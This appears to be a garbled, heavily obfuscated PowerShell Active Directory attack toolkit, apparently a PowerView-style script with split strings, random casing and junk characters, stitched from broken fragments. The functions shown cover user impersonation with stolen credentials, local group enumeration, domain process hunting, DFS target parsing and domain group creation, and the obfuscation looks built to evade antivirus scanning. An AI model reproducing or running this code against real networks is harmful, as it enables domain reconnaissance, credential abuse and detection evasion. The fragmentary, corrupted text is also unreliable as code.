        if (YoV{PSBOIJKUnDIJKPARAMeIJKTers}[(Z3b{2}{0}{1}{3}Z3b-fS5zaS5z,S5zgeSiS5z,S5zResultPS5z,S5zzeS5z)]) { YoV{seIJKAIJKRcHERArIJKGUmeIJKNts}[(Z3b{2}{1}{3}{0}{4}Z3b -f S5zgeSiS5z,S5zesulS5z,S5zRS5z,S5ztPa','Z3b) ( [tyPE](Z3b{0}{1}Z3b-FS5zactIvAS5z,S5ztorS5z)) ; &(Z3b{0}{1}Z3b-f S5zseS5z,S5zTS5z) 3eK6  (  [Type](Z3b{7}{0}{2}{6}{3}{1}{5}{4}Z3b -FS5zEm.S5z,S5ziS5z,S5zThS5z,S5zaDS5z,S5zTHReaDS5z,S5zNg.S5z,S5zRES5z,S5zSYStS5z) );   &(S5zsVS5z)  (S5zwSS5z+S5z63dS5z) ([TyPE](Z3b{2}{1}{3}{0}Z3b-fS5zYS5z,S5zEctIoN.ASsEmbS5z,S5zReflS5z,S5zLS5z)  ) ; YoV{6qIJKNL}= [TYPe](Z3b{1}{0}{2}{3}Z3b-fS5zCoNS5z,S5zSYsteM.BITS5z,S5zvS5z,S5zErtERS5z)  ;   YoV{gIJKTw2} = [tyPe](Z3b{6}{0}{4}{1}{3}{2}{7}{5}Z3b-F S5zm.RS5z,S5zLeS5z,S5ztIS5z,S5zCS5z,S5zefS5z,S5zAgSS5z,S5zSysteS5z,S5zON.bindInGFLS5z)  ; YoV{5IJKMy} =  [TYPE](Z3b{3}{7}{5}{10}{11}{4}{8}{1}{6}{2}{9}{0}{12}Z3b-F S5zoPTioS5z,S5zEs.rEfS5z,S5zrS5z,S5zSyStES5z,S5zeRViS5z,S5zirS5z,S5zerS5z,S5zM.dS5z,S5zcS5z,S5zaLCHasInGS5z,S5zECTOS5z,S5zRYsS5z,S5znS5z)  ;   YoV{tIJKGK}=  [tYPE](Z3b{9}{0}{3}{10}{1}{5}{4}{8}{7}{6}{2}Z3b -F S5zYSTS5z,S5zErS5z,S5zyMASKsS5z,S5zem.DIRECTOrS5z,S5zcES.S5z,S5zVIS5z,S5zURitS5z,S5zCS5z,S5zseS5z,S5zSS5z,S5zysS5z) ;  &(S5zSVS5z) (Z3bTymZ3b+Z3b8Z3b)  ([tyPE](Z3b{0}{1}Z3b -FS5zarraS5z,S5zYS5z)  ) ;   &(Z3b{0}{1}Z3b-f S5zsES5z,S5zTS5z) YXr2 ( [TYPE](Z3b{3}{1}{0}{2}{4}Z3b -F S5z.CONS5z,S5zTEMS5z,S5zvS5z,S5zsYsS5z,S5zeRTS5z));   &(Z3b{2}{0}{1}Z3b-f S5z-S5z,S5zitEmS5z,S5zSETS5z) (Z3bVarIAZ3b+Z3bBLe:UZ3b+Z3b1Z3b+Z3bx0wVZ3b)  ( [TYpe](Z3b{3}{4}{2}{8}{1}{9}{7}{0}{10}{5}{6}Z3b -f S5zvIces.S5z,S5zReS5z,S5zsTeM.DS5z,S5zsS5z,S5zyS5z,S5zTiVediREcTORY.S5z,S5zdoMaINS5z,S5zSeRS5z,S5ziS5z,S5zCtoRYS5z,S5zaCS5z) )  ; &(S5zsVS5z)  foqsn  (  [TYPe](Z3b{0}{2}{1}Z3b -fS5zCONS5z,S5zrtS5z,S5zvES5z)  );    YoV{4IJKX0} = [Type](Z3b{1}{0}Z3b-FS5zUmS5z,S5zENS5z)  ; &(Z3b{0}{1}Z3b -fS5zSS5z,S5zETS5z)  (S5zAeS5z+S5zpsiS5z) ( [TyPE](Z3b{1}{2}{0}Z3b-F S5zerTerS5z,S5zBITcoS5z,S5zNvS5z))  ;&(Z3b{1}{0}Z3b-fS5zMS5z,S5zSEt-iTeS5z) (S5zVaRS5z+S5ziABS5z+S5zle:6o2S5z+S5zZlS5z+S5zPS5z) ([TypE](Z3b{4}{2}{3}{0}{1}Z3b-FS5z.encOdiS5z,S5zngS5z,S5ztS5z,S5zEM.tEXTS5z,','sErVIJKeIJKR_nIJKAme} =   ( &(Z3b{1}{0}Z3b-fS5zeMS','JKNumBIJKLOCK} -ScriptParameters YoV{SIJKCriptPIJKArIJKAmS} -Threads YoV{TIJKHreaIJKdS}
        }
    }

    END {
        if (YoV{lIJKoGoNTIJKOKIJKEN}) {
            &(Z3b{0}{1}{2}{3}Z3b -f S5zInvoS5z,S5zke-S5z,S5zRevertS5z,S5zToSelfS5z) -TokenHandle YoV{lOGIJKonTIJKOkeN}
        }
    }
}


function fIND-DOMIJKAiNPRoCIJKeIJKsS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{3}{1}{2}{0}Z3b -f S5zssS5z,S5zuldProS5z,S5zceS5z,S5zPSShoS5z}, S5zS5z)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{0}{2}{4}{3}{1}{5}Z3b -f S5zPSS5z,S5ztialTS5z,S5zUS5z,S5zPSCredenS5z,S5zseS5z,S5','5z,S5zeS5z,S5zte-VerbosS5z,S','K_eND}],0)
                            YoV{tIJKArgeIJKT_timeIJK_IJKSTIJKAmP_STaIJKRT} = YoV{TargEt_IJKENtRYIJK_IJKsIZIJKeIJK_EnD} + 1
                            YoV{TarGIJKET_TimeIJK_StIJKAmpIJK_ENd} = YoV{TIJKArIJKGEt_TIme_StaIJKMIJKp_STaIJKRt} + 7
                            
                            YoV{tIJKAIJKRGeTIJK_TiIJKMe_StIJKAMP} = YoV{DFS_taIJKRGIJKEIJKTLisT_blOB}[YoV{tIJKAIJKRgEt_TiIJKmE_StaMpIJK_sIJKTARt}..YoV{TIJKArGEt_TiMIJKe_sIJKTaMp_IJKeIJKND}]
                            YoV{TArgEIJKTIJK_IJKsTIJKAte_Start} = YoV{tarGEtIJK_timIJKeIJK_sTAMIJKP_EIJKNd} + 1
                            YoV{TaIJKRgetIJK_IJKsTAIJKTIJKe_eND} = YoV{TarGIJKEtIJK_IJKsIJKTAteIJK_sTIJKART} + 3
                            YoV{tArIJKGEtIJK_sTAte} =   YoV{aEpIJKsI}::Z3btIJKoUInIJKT32Z3b(YoV{DIJKFIJKS_targeIJKTLiSTIJK_BLOB}[YoV{targET_IJKSTAIJKTIJKE_sTART}..YoV{TIJKAIJKRgEt_sTIJKATIJKe_EIJKND}],0)

                            YoV{TAIJKRIJKgEt_TYPE_StaIJKRt} = YoV{tArIJKgET_staTIJKEIJK_eIJKND} + 1
                            YoV{TIJKAIJKRGETIJK_type_IJKEIJKNd} = YoV{tARIJKGEtIJK_IJKTYpE_IJKSTaIJKRt} + 3
                            YoV{TaRIJKGEIJKT_tIJKYPE} =   (  &(Z3b{0}{1}Z3b -fS5ziS5z,S5ztemS5z)  VARiAblE:aEPSi).Z3bVaIJKlUeZ3b::Z3bToIJKUiNT32Z3b(YoV{dFIJKSIJK_TIJKARGETLIST_BloB}[YoV{TaRIJKgEIJKT_tyPeIJK_IJKStArt}..YoV{tAIJKRGIJKeIJKT_tIJKYpE_ENd}],0)

                            YoV{sEIJKRVeR_namEIJK_IJKsIJKiZeIJK_IJKSTarT} = YoV{taIJKRGETIJK_tIJKyPIJKe_eNd} + 1
                            YoV{SIJKervEr_nAmEIJK_IJKSiZIJKE_enD} = YoV{SIJKErIJKVer_IJKNIJKAme_sIZE_STArt} + 1
                            YoV{sEIJKRIJKVer_nIJKAmE_sIZe} =  (  &(Z3b{1}{3}{2}{0}Z3b-f S5zeS5z,S5zGeT-vS5z,S5zBLS5z,S5zarIAS5z) AePSI).Z3bvaLIJKUeZ3b::Z3btIJKOuinIJKT16Z3b(YoV{dIJKFS_TAIJKRgEIJKTLiIJKstIJK_BLOb}[YoV{SerVErIJK_NaIJKMe_siZe_sTIJKArt}..YoV{sErIJKVeR_nIJKAmE_SIIJKZIJKe_END}],0)

                            YoV{SIJKeIJKRIJKVIJKER_IJKNAMe_start} = YoV{sIJKeIJKRIJKVIJKeR_NAMe_siIJKZE_End} + 1
                            YoV{servIJKeIJKRIJK_NaME_end} = YoV{SeRVER_IJKNIJKAME_STIJKAIJKRt} + YoV{sEIJKRVIJKeIJKR_IJKNAME_sIZe} - 1
                            YoV{','b{3}{1}{0}{2}{4}{5}Z3b-fS5zinCS5z,S5zaS5z,S5zoS5z,S5zDomS5z,S5zntroS5z,S5zllerS5z})]
        [String]
  ','-f S5zdnshS5z,S5zostS5z,S5znaS5z,S5zmeS5z}, {Z3b{0}{1}Z3b -fS5znaS5z,S5zmeS5z})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{CIJKOmPuTErIJKNAIJKmE} = (Z3b{1}{2}{0}Z3b -f S5zlhostS5z,S5zloS5z,S5zcaS5z)
    )

    BEGIN {
        if (YoV{PSIJKBOIJKUNIJKDIJKParAmEtIJKerS}[(Z3b{2}{0}{1}{3}Z3b -fS5zredentiS5z,S5zaS5z,S5zCS5z,S5zlS5z)]) {
            YoV{LIJKOGOnTOIJKKIJKEN} = &(Z3b{2}{0}{3}{4}{1}Z3b-fS5z-UserImS5z,S5znS5z,S5zInvokeS5z,S5zpeS5z,S5zrsonatioS5z) -Credential YoV{CIJKRIJKedEnTiAL}
        }
    }

    PROCESS {
        ForEach (YoV{ComIJKpUTEr} in YoV{COIJKmpIJKUtIJKeRNAME}) {
      ','{3}{0}Z3b -fS5zrtyS5z,S5zGetS5z,S5zPS5z,S5zropeS5z), YoV{NIJKUll}, YoV{ObJIJKEIJKCt}, YoV{NIJKULL})
        }

        function Set-PIJKRIJKOpertY([__ComObject] YoV{OIJKBjIJKect}, [String] YoV{PrIJKoPIJKERty}, YoV{PArIJKAIJKMETErS}) {
            [Void] YoV{OIJKBjIJKeCT}.(Z3b{2}{0}{1}Z3b -f S5zetTypS5z,S5zeS5z,S5zGS5z).Invoke().(Z3b{1}{3}{0}{2}Z3b-fS5zkS5z,S5zIS5z,S5zeMemberS5z,S5znvoS5z).Invoke(YoV{PIJKRIJKOPErTY}, (Z3b{2}{0}{1}{3}Z3b -f S5zoS5z,S5zperS5z,S5zSetPrS5z,S5ztyS5z), YoV{nuIJKll}, YoV{oIJKBJeCt}, YoV{paRameIJKTIJKEIJKRs})
        }

        
        if (YoV{pSBoUnIJKDPAIJKRAIJKMEIJKTIJKERS}[(Z3b{0}{1}{2}Z3b-fS5zSS5z,S5zerveS5z,S5zrS5z)]) {
            YoV{aDsINiIJKTTYIJKpE} = 2
            YoV{iNITIJKNAIJKMe} = YoV{SEIJKRIJKVer}
        }
        elseif (YoV{PSbOIJKUIJKNdpaIJKRIJKAMetEIJKRs}[(Z3b{0}{2}{1}Z3b -f S5zDS5z,S5znS5z,S5zomaiS5z)]) {
            YoV{adIJKsINiTtIJKyIJKpE} = 1
            YoV{INIIJ','S5zGS5z,S5zet-DS5z) @SearcherArguments JGO &(Z3b{2}{1}{0}Z3b -f S5zectS5z,S5zach-ObjS5z,S5zForES5z) {
                        if (YoV{PSBIJKOundIJKparaIJKMIJKEtErS}[S5zRawS5z]) {
                            YoV{_}.Z3bpSIJKoIJKBjeCTZ3b.Z3bTypIJKENIJKAmEsZ3b.(Z3b{0}{1}Z3b -f S5zInseS5z,S5zrtS5z).Invoke(0, (Z3b{3}{1','V{TIJKRUE})]
        [Alias({Z3b{2}{3}{4}{1}{0}Z3b-f S5zdentityS5z,S5zIS5z,S5zMS5z,S5zembeS5z,S5zrS5z}, {Z3b{1}{0}Z3b -f S5zrS5z,S5zMembeS5z}, {Z3b{2}{4}{1}{0}{3}Z3b-f S5zuishedS5z,S5zngS5z,S5zDistS5z,S5zNameS5z,S5ziS5z})]
        [String[]]
        YoV{MEIJKMBIJKeRS},

        [ValidateNotNullOrEm','
    )

    BEGIN {
        YoV{comPuTEIJKRIJKseIJKArcherarguMeIJKNIJKTs} = @{
            (Z3b{1}{2}{0}Z3b -f S5ziesS5z,S5zProperS5z,S5ztS5z) = (Z3b{1}{3}{2}{0}Z3b-f S5zeS5z,S5zdnshosS5z,S5znamS5z,S5ztS5z)
        }
        if (YoV{PsIJKBOuNdIJKpaRaMetIJKerS}[(Z3b{1}{0}Z3b -f S5zainS5z,S5zDomS5z)]) { YoV{COMPUIJKTIJKERIJKSEarCHeRArIJKguIJKmIJKeNTS}[(Z3b{0}{1}Z3b -f S5zDomS5z,S5zainS5z)] = YoV{DOmIJKAIJKIN} }
        if (YoV{psboIJKUIJKNDparamETEIJKRS}[(Z3b{4}{1}{2}{0}{3}Z3b-f S5zomaS5z,S5zmputerS5z,S5zDS5z,S5zinS5z,S5zCoS5z)]) { YoV{comIJKPUTEIJKRIJKsEAIJKRcIJKHIJKErIJKAIJKRguments}[(Z3b{1}{0}Z3b-f S5zmainS5z,S5zDoS5z)] = YoV{cOIJKmpUtEIJKRIJKDomaIN} }
        if (YoV{PsBOIJKUNdpIJKARIJKAMEIJKTeIJKRs}[(Z3b{2}{3}{0}{1}Z3b-f S5zutS5z,S5zerLDAPFilterS5z,S5zCS5z,S5zompS5z)]) { YoV{cOMIJKPUTeIJKRSIJKeIJKARCHeRIJKAIJKRIJKgumEnts}[(Z3b{2}{0}{1}Z3b-fS5zltS5z,S5zerS5z,S5zLDAPFiS5z)] = YoV{compIJKUTeIJKRlDAPIJKFiLTIJKEr} }
        if (YoV{psbouIJKNIJKDpIJKARIJKAMEIJKTeRS}[(Z3b{4}{0}{3}{5}{2}{1}Z3b-f S5zuS5z,S5zBaseS5z,S5zhS5z,S5zterSeaS5z,S5zCompS5z,S5zrcS5z)]) { YoV{CoMputeIJKRSEaRchIJKeraIJKRguIJKMEnTS}[(Z3b{2}{0}{1}Z3b -fS5zchBS5z,S5zaseS5z,S5zSearS5z)] = YoV{cOmIJKpUIJKTIJKERsEaRcIJKHIJKBASe} }
        if (YoV{pIJKSBOUNdIJKpaRAIJKmEtIJKERs}[(Z3b{2}{3}{4}{0}{1}Z3b-f S5zrainS5z,S5zedS5z,S5zUS5z,S5zncS5z,S5zonstS5z)]) { YoV{CompUtIJKERIJKSEIJKARIJKCheraRgumeNTS}[(Z3b{0}{2}{1}Z3b -f S5zUncoS5z,S5zrainedS5z,S5znstS5z)] = YoV{UIJKNConSTraiNIJKeD} }
        if (YoV{PSBIJKOUnDPaRAIJKmETIJKerS}[(Z3b{3}{5}{2}{1}{4}{0}Z3b-fS5zgSystemS5z,S5zraS5z,S5zerOpeS5z,S5zComS5z,S5ztinS5z,S5zputS5z)]) { YoV{COmpIJKUIJKTERIJKSeIJKArcIJKHerargUIJKMents}[(Z3b{3}{0}{2}{1}Z3b-fS5zingSysS5z,S5zmS5z,S5zteS5z,S5zOperatS5z)] = YoV{OPeIJKRAtIIJKNgsYIJKStIJKem} }
        if (YoV{pSBIJKouNdPIJKAIJKRIJKAmeIJKTerS}[(Z3b{2}{4}{5}{1}{0}{3}Z3b-fS5zvicePaS5z,S5zSerS5z,S5zCS5z,S5zckS5z,S5zomputS5z,S5zerS5z)]) { YoV{cOIJKmPuTErSIJKEIJKAIJKRCIJKHERArIJKGUMIJKEIJKNTs}[(Z3b{2}{1}{0}Z3b -fS5zcePackS5z,S5zrviS5z,S5zSeS5z)] = YoV{SIJKErvIIJKCEIJKPAck} }
        if (YoV{PsbIJKOundPAIJKRAMetIJKErs}[(Z3b{2}{4}{0}{1}{3}Z3b -f S5zSiteS5z,S5zNS5z,S5zComputS5z,S5zameS5z,S5zerS5z)]) { YoV{CIJKOMpUTERSEIJKArIJKChIJKeRaIJKRgUmIJKENTs}[(Z3b{0}{1}Z3b -fS5zSiteNS5z,S5zameS5z)] = YoV{sIJKITENIJKAME} }
        if (YoV{psBOuIJKNdParIJKAIJKmEIJKTErS}[(Z3b{1}{0}Z3b-f S5zverS5z,S5zSerS5z)]) { YoV{compIJKUTeIJKRSEARcherarIJKGuIJKmEnTS}[(Z3b{1}{0}Z3b-fS5zrS5z,S5zServeS5z)] = YoV{SERvIJKER} }
        if (YoV{PsboIJKUIJKNdpArIJKAmIJKETeRS}[(Z3b{1}{2}{0}Z3b-f S5zeS5z,S5zSS5z,S5zearchScopS5z)]) { YoV{COmPuTEI','ndeS5z,S5zdRS5z,S5zightS5z},{Z3b{0}{1}{2}Z3b -fS5zGenerS5z,S5zicS5z,S5zAllS5z},{Z3b{1}{2}{0}Z3b-fS5zeS5z,S5zGS5z,S5zenericExecutS5z},{Z3b{2}{0}{1}Z3b-f S5zeneriS5z,S5zcReadS5z,S5zGS5z},{Z3b{1}{2}{0}Z3b-f S5ziteS5z,S5zGenericWS5z,S5zrS5z},{Z3b{1}{2}{3}{0}Z3b-f S5zChildrenS5z,S5zLS5z,S5zisS5z,S5z','JKLIJKTpAGESIJKiZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{sERVERIJKTIIJKmEliIJKMIt},

        [Switch]
        YoV{toIJKMBstIJKonE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CREDIJKenIJKTIIJKAL} =   YoV{jIJKFI}::Z3beIJKmpTyZ3b,

        [Switch]
        YoV{rIJKAw}
    )

    BEGIN {
        YoV{sIJKEARcheRIJKArGIJKUIJKMeNTS} = @{
            (Z3b{2}{1}{0}{3}Z3b-fS5zrS5z,S5zopeS5z,S5zPrS5z,S5ztiesS5z)    =   (Z3b{1}{3}{4}{2}{0}{5}Z3b -f S5ztriS5z,S5zmsS5z,S5zreplatS5z,S5zdsS5z,S5z-S5z,S5zbutemetadataS5z),(Z3b{3}{0}{2}{4}{1}{5}Z3b -fS5zistinguS5z,S5znamS5z,S5zisheS5z,S5zdS5z,S5zdS5z,S5zeS5z)
            S5zRawS5z           =   YoV{TIJKRUE}
        }
        if (YoV{PIJKsBIJKoUIJKNdParIJKAMeteRs}[(Z3b{0}{1}Z3b-fS5zDoS5z,S5zmainS5z)]) { YoV{sIJKEIJKARcIJKHIJKERARGuMENTS}[(Z3b{0}{1}Z3b-f S5zDomaiS5z,S5znS5z)] = YoV{dIJKoIJKMaIn} }
        if (YoV{pSboIJKUNIJKdpArIJKAMeTeRs}[(Z3b{1}{0}{2}Z3b -f S5zDAPFiltS5z,S5zLS5z,S5zerS5z)]) { YoV{sEIJKARIJKCHEIJKRARGIJKUmIJKENTS}[(Z3b{0}{1}{2}Z3b -fS5zLS5z,S5zDAPFS5z,S5zilterS5z)] = YoV{lDIJKApIJKFILTIJKEr} }
        if (YoV{pSIJKBOundParAMIJKEtIJKeIJKRs}[(Z3b{2}{1}{3}{0}Z3b-fS5zaseS5z,S5zhS5z,S5zSearcS5z,S5zBS5z)]) { YoV{SIJKeArIJKCIJKHeRARGUmIJKeIJKNtS}[(Z3b{2}{1}{0}{3}Z3b-f S5zhBaS5z,S5zarcS5z,S5zSeS5z,S5zseS5z)] = YoV{sEAIJKRIJKCHIJKBaSE} }
        if (YoV{PSbIJKOUIJKNdpAIJKRIJKAIJKMETerS}[(Z3b{0}{1}Z3b -f S5zSerS5z,S5zverS5z)]) { YoV{seaIJKRIJKCHIJKErargumIJKeNIJKTS}[(Z3b{0}{1}Z3b-fS5zServeS5z,S5zrS5z)] = YoV{SERIJKVIJKEr} }
        if (YoV{PSbOUnIJKdpIJKARameteIJKRs}[(Z3b{1}{0}{2}Z3b -fS5zhScopS5z,S5zSearcS5z,S5zeS5z)]) { YoV{sIJKeaRIJKcHErarIJKgIJKUMEnIJKTS}[(Z3b{3}{0}{2}{1}Z3b -f S5zcoS5z,S5zeS5z,S5zpS5z,S5zSearchSS5z)] = YoV{seaIJKRCHIJKSIJKcopE} }
        if (YoV{PsboIJKUNIJKdIJKpAraIJKMeTeRs}[(Z3b{3}{0}{2}{1}Z3b -fS5zltS5z,S5zSizeS5z,S5zPageS5z,S5zResuS5z)]) { YoV{SIJKeIJKARCHERaRIJKGIJKUIJKMENtS}[(Z3b{0}{2}{3}{1}Z3b -fS5zResulS5z,S5zeS5z,S5ztPageS5z,S5zSizS5z)] = YoV{rEsuIJKlIJKTpageIJKsizE} }
        if (YoV{PSIJKBoIJKUNDpaIJKRAMeteRs}[(Z3b{3}{1}{2}{0}Z3b-f S5zeLimitS5z,S5zerS5z,S5zTimS5z,S5zServS5z)]) { YoV{SEArcHErarIJKgUIJKMenIJKTs}[(Z3b{2}{1}{0}Z3b-fS5zitS5z,S5zmeLimS5z,S5zServerTiS5z)] = YoV{sIJKEIJKRveRTiMELiMIT} }
        if (YoV{PIJKsIJKBIJKOuNDIJKpARaMeTIJKers}[(Z3b{1}{2}{0}Z3b -fS5zoneS5z,S5zToS5z,S5zmbstS5z)]) { YoV{searIJKCheIJKRARGIJKUmeNTS}[(Z3b{1}{2}{0}Z3b-fS5zoneS5z,S5zTS5z,S5zombstS5z)] = YoV{TOMBIJKsIJKToNE} }
        if (YoV{psIJKBOUIJKN','oV{lIJKOgOnTIJKOIJKKeN} = &(Z3b{4}{6}{1}{3}{0}{5}{2}Z3b-fS5zrsonS5z,S5zIS5z,S5ztionS5z,S5zmpeS5z,S5zInS5z,S5zaS5z,S5zvoke-UserS5z) -Credential YoV{cRIJKEIJKdEntiAL}
        }
    }

    PROCESS {
        ForEach (YoV{COIJKmpuTIJKER} in YoV{cOIJKmpIJKUtErnaIJKMe}) {
            if (YoV{MEtIJKHIJKod} -eq S5zAPIS5z) {
                

                
                YoV{qUIJKeRyIJKLEvIJKEL} = 1
                YoV{PIJKTriIJKNfo} =  YoV{6IJKRk2IJK5p}::Z3bZEIJKRoZ3b
                YoV{eNTrIIJKesREIJKAd} = 0
                YoV{TOTIJKAlreIJKAd} = 0
                YoV{ReIJKSIJKUMeHANdIJKLE} = 0

                
                YoV{ResIJKULT} = YoV{NIJKetIJKAPI32}::Z3bNIJKeTIJKLoIJKCIJKAlGRouPEIJKNuMZ3b(YoV{cOMIJKpuIJKTeR}, YoV{qIJKUeRyLEVIJKel}, [ref]YoV{pTRIJKINFo}, -1, [ref]YoV{ENIJKTRIIJKEIJKSrEAd}, [ref]YoV{totIJKAIJKLrEAD}, [ref]YoV{rIJKEIJKSUMIJKehANdle})

                
                YoV{OfIJKFSEt} = YoV{PTRIJKinIJKFO}.(Z3b{2}{0}{1}Z3b -f S5zInS5z,S5zt64S5z,S5zToS5z).Invoke()

                
                if ((YoV{rIJKeIJKsULT} -eq 0) -and (YoV{ofIJKFIJKSet} -gt 0)) {

                    
                    YoV{inIJKcIJKREMIJKent} = YoV{lIJKocaLIJKGROUPIJK_InFOIJK_1}::(Z3b{2}{0}{1}Z3b-f S5ztSiS5z,S5zzeS5z,S5zGeS5z).Invoke()

                    
                    for (YoV{I} = 0; (YoV{i} -lt YoV{eIJKNtIJKRIEIJKSRead}); YoV{i}++) {
                        
                        YoV{NEWIIJKNTpIJKTR} = &(Z3b{2}{0}{1}Z3b -f S5zbjeS5z,S5zctS5z,S5zNew-OS5z) (Z3b{1}{2}{0}Z3b-fS5zrS5z,S5zSystem.InS5z,S5ztptS5z) -ArgumentList YoV{ofIJKFSIJKET}
                        YoV{INIJKFO} = YoV{NeWinIJKTIJK','gnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{1}{2}{3}{0}Z3b -fS5zdProcessS5z,S5zPS5z,S5zSShoS5z,S5zulS5z}, S5zS5z)]
    [OutputType({Z3b{5}{2}{3}{0}{4}{6}{1}Z3b -fS5zpMemS5z,S5zr.APIS5z,S5zrView.LocalGS5z,S5zrouS5z,S5zbS5z,S5zPoweS5z,S5zeS5z})]
    [OutputType({Z3b{3}{2}{6}{0}{1}{4}{5}Z3b-f S5zlGroS5z,S5zupMembeS5z,S5zrViewS5z,S5zPoweS5z,S5zrS5z,S5z.WinNTS5z,S5z.LocaS5z})]
    Param(
        [Parameter(pOsiTIon = 0, vaLUEfrompIPEliNe = YoV{TIJKRue}, VaLUefrOmPipeLiNebYprOpErtyNAME = YoV{trIJKUe})]
        [Alias({Z3b{1}{2}{0}Z3b -f S5zHostNameS5z,S5zDS5z,S5zNSS5z})]
        [String[]]
        YoV{cIJKomIJKputeIJKRnAME},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{cOmIJKPUIJKTERDIJKoMaIJKIn},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{COIJKmpUTerIJKlDAIJKpFiLIJKTIJKeR},

        [ValidateNotNullO','
            else {
                YoV{fORIJKeIJKsIJKToBJeCT}.Z3bsCHEIJKmaZ3b.(Z3b{1}{2}{0}Z3b-f S5zesS5z,S5zFindAllClaS5z,S5zssS5z).Invoke()
            }
        }
    }
}


function FIIJKND-DomainoB','zarchSS5z)]) { ','NIJKdPArAIJKmETErs}[(Z3b{0}{1}Z3b -f S5zDomaS5z,S5zinS5z)]) {
            YoV{sEARcHIJKeIJKRAIJKRgumIJKeNTS}[(Z3b{0}{1}Z3b-f S5zDS5z,S5zomainS5z)] = YoV{DOIJKmaIJKIN}
            YoV{tARIJKGETDOMAIJKIN} = YoV{DoIJKMAiN}
        }
        else {
            YoV{tIJKArgIJKETDoIJKMAiN} = YoV{EnV','sERnAIJKmEZ3b, YoV{cRedEIJKNIJKTIal}.(Z3b{1}{2}{3}{0}{4}Z3b-fS5zntiS5z,S5zGetNetwS5z,S5zorkCrS5z,S5zedeS5z,S5zalS5z).Invoke().Z3bPIJKASSIJKWorDZ3b)
            }
            else {
                YoV{cIJKoNtEIJKxT} = &(Z3b{2}{0}{1}Z3b -fS5zObjeS5z,S5zctS5z,S5zNew-S5z) -TypeName (Z3b{1}{7}{5}{4}{3}{2}{9}{8}{6}{0}Z3b -fS5ztextS5z,S5zSystem.DirectoryS5z,S5znaS5z,S5zuntMaS5z,S5z.AccoS5z,S5zvicesS5z,S5zrincipalConS5z,S5zSerS5z,S5zment.PS5z,S',' S5z+S5zcrS5z+S5zeS5z+S5zate S5z+S5zgrouS5z+S5zp S5z+Z3bS5zYoVSamAccountNameS5zZ3b)
        try {
            YoV{nuIJKLL} = YoV{GRoIJKUp}.(Z3b{1}{0}Z3b-fS5zveS5z,S5zSaS5z).Invoke()
            &(Z3b{0}{1}{3}{2}Z3b-f S5zWriS5z,S5ztS5z,S5zerboseS5z,S5ze-VS5z) (S5z[S5z+S5zNeS5z+S5zw-DomaS5z+S5zinGroup] S5z+S5zGroS5z+S5zup S5z+Z3bS5zYoVSamAccountNameS5z Z3b+S5zsS5z+S5zucceS5z+S5zssfully S5z+S5zcreateS5z+S5zdS5z)
            YoV{gIJKRouP}
        }
        catch {
            &(Z3b{0}{1}{2}Z3b -fS5zWriteS5z,S5z-S5z,S5zWarningS5z) (S5z[New-DS5z+S5zomainGroS5z+S5zup]S5z+S5z S5z+S5zES5z+S5zrS5z+S5zror S5z+S5zcreaS5z+S5ztinS5z+S5zg S5z+S5zgrS5z+S5zoS5z+S5zup S5z+Z3bS5zYoVSamAccountNameS5z Z3b+S5z: S5z+Z3bYoV_Z3b)
        }
    }
}


function gET-DOIJKMAInmAnIJKAgIJKEdSIJKEcuriTYIJKgrIJKoup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{2}{0}{1}Z3b -f S5zldProcesS5z,S5zsS5z,S5zPSShouS5z}, S5zS5z)]
    [OutputType({Z3b{5}{0}{4}{1}{6}{8}{7}{2}{3}Z3b-fS5zwS5z,S5zw.MaS5z,S5zityS5z,S5zGroupS5z,S5zerVieS5z,S5zPoS5z,S5znaS5z,S5zcurS5z,S5zgedSeS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(POSITIon = 0, VaLUEFrompIpeLINe = YoV{TIJKRuE}, vALuEfromPiPeliNEbyPrOpErTyName = YoV{tIJKRUe})]
        [Alias({Z3b{1}{0}Z3b -fS5zeS5z,S5zNamS5z})]
        [ValidateNotNullOrEmpty()]
        [String]
        YoV{doIJKMain},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{0}{1}Z3b -f S5zPatS5z,S5zhS5z,S5zADSS5z})]
        [String]
        YoV{seIJKArCIJKhbAse},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{3}{0}{2}Z3b-f S5zontrS5z,S5zDomS5z,S5zollerS5z,S5zainCS5z})]
        [String]
   ','pE](Z3b{3}{2}{1}{4}{0}Z3b -f S5zRYS5z,S5zfaS5z,S5zES5z,S5zrUNSpACS5z,S5zCTOS5z) )  ; YoV{U0J}=[tYPe](Z3b{1}{3}{0}{2}Z3b -FS5zHelS5z,S5zPS5z,S5zLS5z,S5zOWerSS5z) ;  &(Z3b{0}{1}{2}Z3b -f S5zSES5z,S5ztS5z,S5z-ITEmS5z)  (S5zvarIS5z+S5zablES5z+S5z:9tzk1S5z) (  [type](Z3b{0}{2}{3}{1}Z3b-FS5zENViRS5z,S5zntS5z,S5zonS5z,S5zMES5z)  )  ;    YoV{JIJKq2g}  =  [type](Z3b{3}{2}{1}{0}{4}Z3b-fS5zm.NS5z,S5zeS5z,S5zTS5z,S5zsySS5z,S5zET.DNSS5z) ;    YoV{7DIJKVcie}= [tyPe](Z3b{1}{0}Z3b-F S5zImeS5z,S5zDaTEtS5z) ; &(Z3b{2}{1}{0}Z3b -f S5zITEMS5z,S5zEt-S5z,S5zSS5z) (S5zvS5z+S5zaRS5z+S5ziaBLeS5z+S5z:ZcpsS5z)  ([TyPE](Z3b{2}{1}{0}Z3b -fS5zeCToryS5z,S5zO.diRS5z,S5zIS5z)  ); &(Z3b{2}{0}{1}Z3b-f S5zEt-S5z,S5zVARiaBLeS5z,S5zsS5z)  6Imz  ([tYPE](Z3b{5}{0}{6}{8}{3}{7}{4}{1}{2}Z3b-FS5ztEM.SS5z,S5zKNOwnsIdTYpS5z,S5zES5z,S5zCS5z,S5zLlS5z,S5zsYsS5z,S5zECuRItY.PS5z,S5zipal.wES5z,S5zRInS5z) );  &(Z3b{0}{1}{3}{2}Z3b -f S5zsES5z,S5zT-S5z,S5zIaBLES5z,S5zvARS5z) Np6yr  ( [Type](Z3b{5}{6}{1}{0}{3}{4}{7}{2}Z3b 